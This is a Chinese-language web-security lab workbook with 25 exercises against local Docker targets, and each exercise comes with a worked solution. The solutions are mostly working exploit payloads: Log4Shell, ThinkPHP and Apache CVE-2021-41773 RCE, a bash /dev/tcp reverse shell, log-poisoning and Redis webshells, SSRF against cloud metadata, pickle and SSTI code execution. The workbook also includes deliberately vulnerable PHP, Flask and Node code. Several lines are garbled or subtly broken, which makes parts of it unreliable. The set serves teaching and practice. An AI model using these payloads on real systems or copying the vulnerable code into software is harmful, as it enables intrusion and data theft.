# Web 練習題集（線上模組配用）

> 每題給出：環境描述／檢查點／解法（含 flag 示意）／預期時長。
> 所有題目本機 Docker 即可完成：無外網依賴。Flag 都是**本地生成的範例值**，以實際環境為準。

---

## 0 · 完整環境啟動腳本

```bash
mkdir -p ~/web-lab && cd ~/web-lab
# 內包含 PHP/Flask/Node 等環境
cat > docker-compose.yml <<'EOF'
version: '3.9'
services:
  webchatinstall: # PHP LFI+弱密碼+ Cookie 集成 (內含 dvwa 題集)
    image: dvwa/dvwa:latest
    ports:
      - "8081:80"
  sqlilab:
    image: acgpiano/sqli-labs:latest
    ports:
      - "8100:80"
  vulhub-tp:
    image: sossy/thinkphp:5.0.23-rce   # 見 Docker Hub 標題
    ports: ["8200:80"]
EOF
docker compose up -d
```

> ⚠️ `docker pull acgpiano/sqli-labs` 的 image 存在但可能改動；若不行請去 GH 搜 `docker sqli-labs`。

---

## 練習 1 · 快速信息收集（30 分鐘 · 練習==方法論）

**檢查點**：
1. 打開 `http://127.0.0.1:8081`，看 Wappalyzer 的技術棧。
2. 用 `whatweb` + `curll -sI` 驗證所有版本字串。
3. 用 `gobuster` 探 CSS/JS 常存檔的「未列出的文件」，看 `.git/config``buttar …`

**解法**：

```bash
whatweb -v http://127.0.0.1:8081
curl -sI http://127.0.0.1:8081/ | grep -iE 'server|x-powered'
# .git 探
git clone https://github.com/lijiejie/GitHack /tmp/gh
python3 /tmp/gh/GitHack.py http://127.0.0.1:8081/.git/
ls /tmp/gh/127.0.0.1:8081/            # 出源碼 → 有 flag 的文件
```

Flag 示意：`.git/flag.txt` 內含 `flag{your_flag}`。

---

## 練習 2 · Log4Shell RCE（30 分鐘）

**環境**（vulhub）：

```bash
cd ~/vulhub/log4j/CVE-2021-44228 && docker compose up -d
# 靶機名/埠在 compose 裡預設 8983 (Solr)
```

**流程**：

```bash
# ① 確認可用之端點（Solr）
curl http://127.0.0.1:8983/solr/
# ② 建 DNSLOG/自架 LDAP server + 打出此 Payload
curl "http://127.0.0.1:8983/solr/" \
     -H 'X-API-Version: ${jndi:ldap://YOUR:1389/Exploit}'
# ③ 拿 class file
cat Exploit.java; javac Exploit.java
```

Flag 位置：`/var/www/html/flag.php` 或 `env | grep -i flag`。

---

## 練習 3 · ThinkPHP 5.0.x RCE（20 分鐘）

```bash
cd ~/vulhub/thinkphp/5-rce && docker compose up -d
```

**要求**：**不得**使用 GitHub PoC 的完整 shell；手打 curl；兩種 URL 順序。

```bash
# 主 payload
curl "http://127.0.0.1:8200/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20/"
# 拿 flag
curl '…&vars[1][]=cat%20/flag'
```

Flag：`flag{tp5_local_rce}`。

---

## 練習 4 · Apache CVE-2021-41773 路徑穿越 → RCE（20 分鐘）

```bash
cd ~/vulhub/httpd/CVE-2021-41773 && docker compose up -d
```

```bash
# 讀檔
curl --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# RCE（ 2.4.49 要求 mod_cgi 開啟）
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; cat /flag' \
   "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

---

## 練習 5 · SQL 注入：布爾盲注 + 拿 flag（30 分鐘）

**環境**：

```bash
cd ~/web-lab/sqli-test && cat > app.py <<'EOF'
import sqlite3
from flask import Flask, request, render_template_string
app = Flask(__name__)
FLAG = 'flag{sqli_blind_gotcha}'
@app.route('/item')
def item():
    id = request.args.get('id', '1')
    con = sqlite3.connect('data.db')
    try:
        rows = con.execute("SELECT id,body FROM item WHERE id = %s;" % id).fetchall()
    except Exception as e:
        return "Query Error", 200
    if rows:
        return render_template_string(''.join(r[1] for r in rows))
    return "Not found"
EOF
python3 app.py  # 8081
```

**目標**：`?id=1' and …` 或 `?id=...' and 1 …`。

> 自己寫一個拼字串：`SELECT id,body FROM item WHERE id = [user_input];`。
> 後端使用 `sqlite3 - never `;\

**解法步驟**：

```python
payload = "1 AND ascii(substr((SELECT flag FROM secrets LIMIT 1),1,1))>=65"
# oracle 是「返回 'Not found' 有／無」 == 檢測點
```

Flag：`flag{sqli_blind_gotcha}`。

---

## 練習 6 · NoSQL 注入（15 分鐘）

**環境**：Node Express + mongo for `login`，內像：

```js
app.post('/login', (req, res) => {
    db.admins.findOne({ user: req.body.user, pass: req.body.pass })
});
```

**payload**：

```json
{"user":{"$ne": null},"pass":{"$ne": null}}
```

或逐字元：

```json
{"user":"admin","pass":{"$regex":"^a"}}
```

---

## 練習 7 · SQLi union 限 hike（10 分鐘）

<solvesqlilabs>

```bash
# 開 sqlilabs : http://127.0.0.1:8100/Less-5/
# 造 OR 會被 handling；涵蓋： union select 1,user(),3（第 1 題）
```

後：

```bash
curl 'http://127.0.0.1:8100/Less-5/?id=-1%20union%20select%201,2,3'
```

---

## 練習 8 · LFI 讀 flag + 讀源碼（20 分鐘）

**環境**：

```bash
mkdir -p ~/web-lab/lfi && cd ~/web-lab/lfi
cat > index.php <<'EOF'
<?php
$page = $_GET['file'] ?? 'home.php';
include($page);        // 弱點點
EOF
php -S 127.0.0.1:8090
```

**解法**：

```bash
# 看自己
curl 'http://127.0.0.1:8090/?file=php://filter/read=convert.base64-encode/resource=index.php' | base64 -d
# 拿 flag（若有 /var/www/flag）
curl 'http://127.0.0.1:8090/?file=/var/www/flag'
```

---

## 練習 9 · 上傳 → LFI RCE（30 分鐘）

- 上傳介面無黑名單（可用 `.php`），但在「directories 上有可寫」。
- **payload**: 上傳 shell.php，後 `?file=uploads/shell.php` → RCE。

> 若上傳是 `.jpg`，又想 RCE → `.htaccess` 的 `AddType` 材料 需要 `allow_override`。

**釋放**： 確保 `Include` 能跑到 `.htaccess` 有 suff。

---

## 練習 10 · 命令注入（20 分鐘）

**環境**：php code

```php
<?php system('ping -c 1 ' . $_GET['ip']); ?>
```

**解法**：

```bash
curl 'http://127.0.0.1:8081/?ip=127.0.0.1%0acat%20flag'
# 或 cat `${IFS}` :
curl 'http://127.0.0.1:8081/?ip=127.0.0.1${IFS}cat${IFS}flag'
```

---

## 練習 11 · Blind 命令注入 + OOB（20 分鐘）

`|| cmd` 的回呼不送回；你 **負 doc 的 auth**：：

```bash
# ① local listens (nc)
nc -lvp 4444
# ② payload
curl 'http://target/?ip=1%7C%7Cbash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/<IP%/4444%200>%261%27'
```

> 若出網被擋 → `cat /flag > /var/www/html/flag.txt` → `GET /flue This should not be a 404`.
>
> 一般 CTF 沒外網？挑戰內網出網。

---

## 練習 12 · 上傳 `.htaccess` 與 file 引用（30 分鐘）

- 上傳 `.htaccess` + jpg 圖片馬。
- `?file=uploads/img.php` 引用上傳的 jpg 帶出 `payload=…]`。

#### 場景專知:
> `apxs2 -> mod_php` 需要 `enable`；設定 `flag` 3102。

---

## 練習 13 · 日誌投毒 RCE（30 分鐘）

「檔案包含 + log」的終殺例：

```bash
# 步驟
curl -H 'User-Agent: <?php system($_GET[0]);?>' 'http://target/'
# 靶機: nginx 的 access log 一般在 /var/log/nginx/access.log
curl 'http://target/?file=/var/log/nginx/access.log&0=id;cat /flag'
```

> 各文件為解題共尖; 講師補充 logging 被 洪療值知 treat。',
> 歸一跳的 delimiter**把 URL 的 `0=` decode」。

** 這組練習用的真實 flag 額外給予**： flag 由講師手動插入 `access log` 本身，

---

## 練習 14 · PHP Session 上傳進度（30 分鐘）

- PHP 的 `session.upload_progress.enabled` ON；先 `include('/tmp/sess_XXXX')`。
- 解法見 W4 §4.2。

---

## 練習 15 · SSRF Metadata 執行（進階 30 分）

```bash
# 題目: flask
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    resp = requests.get(url, proxies={'http': None,'https': None})
```

**解法**：

```bash
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'
# 或 WebLogic 用 localhost:7001 Bean 反射 / EC2 credential step
```

---

## 練習 16 · SSRF → Redis（45 分鐘）

```text
① Gopher 转 list (Write raw Redis to server)
gopher://127.0.0.1:6379/_ set x1 "%0d%0a%0d%0a<?php system($_GET[0]);?>%0d%0a'
and config set dir /var/www, rewrite etc
② 生成 payload 由 python（任意 redis 服務）
③ 測驗 šálbash 文件包含
```

** 服器安裝 Ruby Gopher 之 SSRF Redis 分發器**：
```bash
git clone https://github.com/tarunkant/Gopherus.git
python3 gopherus.py --exploit redis    # 可生成 full Url
```

---

## 練習 17 · XXE 本 File Read（20 分鐘）

```text
POST 設 XML 的 endpoint。
payload:
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY foo "file:///etc/passwd">]><r>&foo;</r>
```

> 若對方禁 `external` → OOB。

---

## 練習 18 · SSTI 找 flag（30 分鐘）

**環境**：

```python
render_template_string(user_string)
```

```bash
curl "http://target/?name={{7*7}}"
# → 输出 49，故 Jinja2。
# 拿 root flag:
curl "http://target/?name={{ ''.__class__.__mro__[1].__subclasses__() }}"
```

**flask jinja2 沙盒 bypass**見 W6 §B.4。

---

## 練習 19 · PHP 反序列化（30 分鐘）

```php
class A { public $cmd = 'echo hello'; function __destruct(){ eval($this->cmd); } }
```

```php
// 生成 payload
php_gen.php:  echo urlencode(serialize(new A));
```

> 記入 **s:strlen**，把 string 內內已核對（若長度為8, 如 system("id")，最終 `s:11`=11 內）。

---

## 練習 20 · Python pickle 反序列化

```python
# 前端直接 pickle.loads(base64.b64decode(user))
class Exploit(object): 
    def __reduce__(self):
        return eval, ("__import__('os').popen('cat /flag').read()",)
print(base64.b64encode(pickle.dumps(Exploit())))
```

---

## 練習 21 · JWT 弱金鑰 + 競態 +越權（複合含）

- 抓 token decode: `head.url.` 代字以 head decode 查 `alg`。
- `alg:none` → 改繞。
- jwt-tool / hashcat -m 16500 爆金鑰。

---

## 練習 22 · Prototype Pollution (Node)

```bash
# 找 endpoint app.getmerge(...) 是 Object deep merge,
# payload:
{"__proto__":{"isAdmin": true}}
# 通联: 另一 api: `if (user.isAdmin) return flag`
```

---

## 練習 23 · SSTI 沙盒 escape（進階 45 分）

- Flask `jinja2.sandbox.SandboxedEnvironment`。
- 常見 payload：
```text
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

---

## 練習 24 · Web Logic 反序列化 / XMLDecoder（進階 60 分）

```bash
cd vulhub/weblogic/CVE-2017-10271 && docker compose up -d
# POST /wls-wsat/CoordinatorPortType，Here修 po 黑式。
# callback XMLDecoder id  / cat flag。 
```

***

## 練習 25· 綜合源碼審計（45 分钟）

> 對 03 号 php app（可留 cod 數）進行：
> - 3 個真實漏洞 + 修補示例；
> - 提交 1 份簡短 writeup（用 `05-模板/Writeup報告模板.md`）。

---

## 附錄 · 練習開小分機（教師/學員共用）

| 練習 | 難度 | 預期時間 | 對應學習 |
|---|---|---|---|
| 1 | ★ | 30m | 信息收集 |
| 2 | ★★ | 30m | Log4Shell |
| 3 | ★★ | 20m | ThinkPHP RCE |
| 4 | ★★ | 20m | Apache traversal |
| 5-7 | ★★ | 60m | SQLi/NoSQL |
| 8/9 | ★★ | 50m | LFI / 上傳 |
| 10/11 | ★★ | 40m | 命令注入 |
| 12 | ★★ | 30m | 上傳與引用 |
| 13/14 | ★★★ | 60m | 日誌/user-progress |
| 15/16 | ★★★ | 75m | SSRF/Redis |
| 17 | ★★ | 20m | XXE |
| 18/19/20 | ★★ | 90m | SSTI/反序列化 |
| 21/22 | ★★★ | 45m | 邏輯/原型 |
| 23 | ★★★★ | 45m | 沙盒 SSTI |
| 24 | ★★★★ | 60m | WebLogic |
| 25 | ★★★ | 45m | 綜合審計 |
